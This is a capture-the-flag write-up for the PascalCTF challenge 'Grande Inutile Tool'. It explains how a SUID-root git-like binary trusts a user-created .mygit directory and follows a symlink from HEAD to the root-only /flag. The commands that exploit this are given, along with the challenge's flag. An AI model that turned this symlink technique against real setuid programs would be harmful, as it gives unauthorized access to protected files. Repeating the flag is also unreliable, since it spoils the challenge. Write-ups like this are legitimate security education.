# Challenge Writeup: Grande Inutile Tool

## Challenge

> Many friends of mine hate git, so I made a git-like tool for them.
>
> The flag can be found at /flag.
>
> You can get a user here: https://git-service.ctf.pascalctf.it
>
> ssh <user>@git.ctf.pascalctf.it -p2222

## Investigation

Initial enumeration reveals the flag is located at `/flag`, but it is only readable by the root user.

Checking the `mygit` binary reveals it has the SUID bit set:

```
$ ls -la /usr/bin/mygit
-rwsr-xr-x 1 root root 54632 Jan 30 09:47 /usr/bin/mygit
```

This means `mygit` runs with root privileges. Interestingly, even though a repository is already initialized at the root of the filesystem, the binary fails when we try to add the flag:

```
$ mygit add /flag
File is outside the repository: /flag
```

## Vulnerability

Running `mygit init` creates a `.mygit` directory owned by root, preventing user modification:

`drwx------   5 root         root         4096 Feb  2 13:46 .mygit`

However, the binary fails to verify directory ownership. If we manually create `.mygit` before running any commands, mygit will treat it as a valid repository. Since the binary is SUID root, it will follow any symbolic links we place inside our controlled `.mygit` directory, even those pointing to protected files like `/flag`.

## Solution

We can exploit this by creating a manual repository and symlinking the HEAD file (which stores the branch name) to the flag. When `mygit status` attempts to read the branch name, it reads and prints the flag instead.

```
$ mkdir .mygit
$ ln -s /flag .mygit/HEAD
$ mygit status
On branch pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}

Nothing to commit, working tree clean
```